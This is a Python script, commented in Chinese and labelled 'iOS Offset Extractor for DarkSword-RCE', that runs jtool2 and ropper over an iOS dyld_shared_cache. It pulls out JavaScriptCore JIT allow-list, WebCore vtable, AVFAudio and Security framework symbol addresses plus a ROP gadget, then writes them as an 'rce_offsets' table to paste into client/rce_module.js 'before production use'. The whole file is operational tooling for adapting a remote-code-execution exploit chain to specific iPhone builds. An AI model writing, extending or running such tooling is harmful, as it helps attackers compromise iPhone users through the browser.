#!/usr/bin/env python3
"""
iOS Offset Extractor for DarkSword-RCE

此工具从 iOS 固件的 dyld_shared_cache 中提取所需的 offset 和 gadget。

前置条件:
1. 已下载目标 iOS build 的 IPSW
2. 已安装 jtool2 或 ipsw 工具
3. 已提取 dyld_shared_cache_arm64e

使用方法:
    python3 extract_offsets.py /path/to/dyld_shared_cache_arm64e iPhone14,2 18.4 22F76

输出:
    - offsets_iPhone14_2_18_4_22F76.json
    - 可直接导入到 rce_module.js 的 offset 表
"""

import subprocess
import re
import json
import sys
from pathlib import Path

class OffsetExtractor:
    def __init__(self, cache_path, device_model, ios_version, build_id):
        self.cache_path = Path(cache_path)
        self.device_model = device_model
        self.ios_version = ios_version
        self.build_id = build_id
        self.offsets = {}
        
        if not self.cache_path.exists():
            raise FileNotFoundError(f"Cache not found: {cache_path}")
    
    def run_jtool2(self, *args):
        """执行 jtool2 命令"""
        try:
            result = subprocess.run(
                ['jtool2'] + list(args) + [str(self.cache_path)],
                capture_output=True,
                text=True,
                timeout=60
            )
            return result.stdout
        except FileNotFoundError:
            print("ERROR: jtool2 not found. Please install from http://www.newosxbook.com/tools/jtool.html")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            print(f"WARNING: jtool2 command timed out: {args}")
            return ""
    
    def extract_symbol(self, pattern, library=None):
        """提取符号地址"""
        print(f"  Searching: {pattern}")
        
        # 使用 --bind 查找符号
        output = self.run_jtool2('--bind')
        
        # 解析输出
        matches = re.findall(pattern, output, re.MULTILINE)
        if matches:
            # 提取地址（通常在行的开头或特定位置）
            for match in matches[:3]:  # 显示前3个匹配
                print(f"    Found: {match}")
            return matches[0] if matches else None
        
        print(f"    NOT FOUND")
        return None
    
    def extract_jsc_offsets(self):
        """提取 JavaScriptCore 相关 offset"""
        print("\n[JavaScriptCore Offsets]")
        
        symbols = {
            'JavaScriptCore__globalFuncParseFloat': r'JavaScriptCore.*globalFuncParseFloat.*0x([0-9a-f]+)',
            'JavaScriptCore__jitAllowList': r'JavaScriptCore.*jitAllowList.*0x([0-9a-f]+)',
            'JavaScriptCore__jitAllowList_once': r'JavaScriptCore.*jitAllowList_once.*0x([0-9a-f]+)',
        }
        
        for name, pattern in symbols.items():
            addr = self.extract_symbol(pattern)
            if addr:
                # 转换为 BigInt 格式
                self.offsets[name] = f"0x{addr}n"
    
    def extract_webkit_offsets(self):
        """提取 WebKit 相关 offset"""
        print("\n[WebKit Offsets]")
        
        symbols = {
            'WebCore__DedicatedWorkerGlobalScope_vtable': r'WebCore.*DedicatedWorkerGlobalScope.*vtable.*0x([0-9a-f]+)',
            'WebCore__PAL_getPKContactClass': r'WebCore.*PAL.*getPKContactClass.*0x([0-9a-f]+)',
        }
        
        for name, pattern in symbols.items():
            addr = self.extract_symbol(pattern)
            if addr:
                self.offsets[name] = f"0x{addr}n"
    
    def extract_avfaudio_offsets(self):
        """提取 AVFAudio 相关 offset"""
        print("\n[AVFAudio Offsets]")
        
        symbols = {
            'AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice': r'AVFAudio.*AVSpeechSynthesisVoice.*0x([0-9a-f]+)',
            'AVFAudio__OBJC_CLASS__AVSpeechUtterance': r'AVFAudio.*AVSpeechUtterance.*0x([0-9a-f]+)',
        }
        
        for name, pattern in symbols.items():
            addr = self.extract_symbol(pattern)
            if addr:
                self.offsets[name] = f"0x{addr}n"
    
    def extract_security_offsets(self):
        """提取 Security 框架 offset"""
        print("\n[Security Framework Offsets]")
        
        symbols = {
            'Security__gSecurityd': r'Security.*gSecurityd.*0x([0-9a-f]+)',
            'Security__SecKeychainBackupSyncable': r'Security.*SecKeychainBackupSyncable.*0x([0-9a-f]+)',
        }
        
        for name, pattern in symbols.items():
            addr = self.extract_symbol(pattern)
            if addr:
                self.offsets[name] = f"0x{addr}n"
    
    def extract_rop_gadgets(self):
        """提取 ROP gadget（需要 ropper 工具）"""
        print("\n[ROP Gadgets]")
        print("  NOTE: ROP gadget extraction requires 'ropper' tool")
        print("  Install: pip3 install ropper")
        
        try:
            # 先提取 TEXT 段
            print("  Extracting __TEXT segment...")
            subprocess.run(
                ['jtool2', '--extract', '__TEXT', str(self.cache_path)],
                capture_output=True,
                timeout=120
            )
            
            text_file = self.cache_path.parent / f"{self.cache_path.name}.__TEXT"
            if not text_file.exists():
                print("  ERROR: Failed to extract __TEXT segment")
                return
            
            # 使用 ropper 查找 gadget
            print("  Scanning for gadgets (this may take several minutes)...")
            result = subprocess.run(
                ['ropper', '--file', str(text_file), '--arch', 'arm64', 
                 '--search', 'mov x0, x1; ret'],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                gadgets = re.findall(r'0x([0-9a-f]+):', result.stdout)
                if gadgets:
                    print(f"  Found {len(gadgets)} 'mov x0, x1; ret' gadgets")
                    self.offsets['rop_gadget_mov_x0_x1_ret'] = f"0x{gadgets[0]}n"
            
            # 清理临时文件
            text_file.unlink()
            
        except FileNotFoundError:
            print("  WARNING: 'ropper' not installed, skipping gadget extraction")
        except subprocess.TimeoutExpired:
            print("  WARNING: Gadget extraction timed out")
    
    def save_json(self):
        """保存为 JSON 文件"""
        output_file = f"offsets_{self.device_model.replace(',', '_')}_{self.ios_version.replace('.', '_')}_{self.build_id}.json"
        
        output_data = {
            "device_model": self.device_model,
            "ios_version": self.ios_version,
            "build_id": self.build_id,
            "extraction_date": subprocess.run(['date', '+%Y-%m-%d'], capture_output=True, text=True).stdout.strip(),
            "offsets": self.offsets,
            "note": "This is a partial extraction. Manual verification required for critical offsets."
        }
        
        with open(output_file, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        print(f"\n[Output]")
        print(f"  Saved to: {output_file}")
        print(f"  Total offsets extracted: {len(self.offsets)}")
        return output_file
    
    def generate_js_snippet(self):
        """生成可直接用于 rce_module.js 的代码片段"""
        key = f"{self.device_model}_{self.ios_version.replace('.', '_')}_{self.build_id}"
        
        js_code = f'''
// Auto-generated offsets for {self.device_model} iOS {self.ios_version} ({self.build_id})
// Generated on: {subprocess.run(['date'], capture_output=True, text=True).stdout.strip()}
// IMPORTANT: These offsets require manual verification before use

rce_offsets["{key}"] = {{
'''
        
        for name, value in self.offsets.items():
            js_code += f"  {name}: {value},\n"
        
        js_code += "};\n"
        
        output_file = f"offsets_{self.device_model.replace(',', '_')}_{self.build_id}.js"
        with open(output_file, 'w') as f:
            f.write(js_code)
        
        print(f"  JavaScript snippet: {output_file}")
        return output_file

def main():
    if len(sys.argv) != 5:
        print("Usage: python3 extract_offsets.py <cache_path> <device_model> <ios_version> <build_id>")
        print()
        print("Example:")
        print("  python3 extract_offsets.py dyld_shared_cache_arm64e iPhone14,2 18.4 22F76")
        print()
        print("To get dyld_shared_cache from IPSW:")
        print("  1. Download IPSW from ipsw.me")
        print("  2. unzip iPhone14,2_18.4_22F76.ipsw")
        print("  3. hdiutil attach <largest_dmg_file>")
        print("  4. cp /Volumes/*/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e .")
        print("  5. hdiutil detach /Volumes/<volume_name>")
        sys.exit(1)
    
    cache_path, device_model, ios_version, build_id = sys.argv[1:5]
    
    print("=" * 70)
    print("iOS Offset Extractor for DarkSword-RCE")
    print("=" * 70)
    print(f"Target: {device_model} iOS {ios_version} ({build_id})")
    print(f"Cache: {cache_path}")
    print()
    
    extractor = OffsetExtractor(cache_path, device_model, ios_version, build_id)
    
    # 提取各类 offset
    extractor.extract_jsc_offsets()
    extractor.extract_webkit_offsets()
    extractor.extract_avfaudio_offsets()
    extractor.extract_security_offsets()
    extractor.extract_rop_gadgets()
    
    # 保存结果
    json_file = extractor.save_json()
    js_file = extractor.generate_js_snippet()
    
    print()
    print("=" * 70)
    print("Next Steps:")
    print("=" * 70)
    print(f"1. Review {json_file} for completeness")
    print(f"2. Manually verify critical offsets in a debugger")
    print(f"3. Copy {js_file} content to client/rce_module.js")
    print(f"4. Test on target device before production use")
    print()
    print("WARNING: Automated extraction may miss some offsets.")
    print("         Always verify in a controlled environment first.")

if __name__ == '__main__':
    main()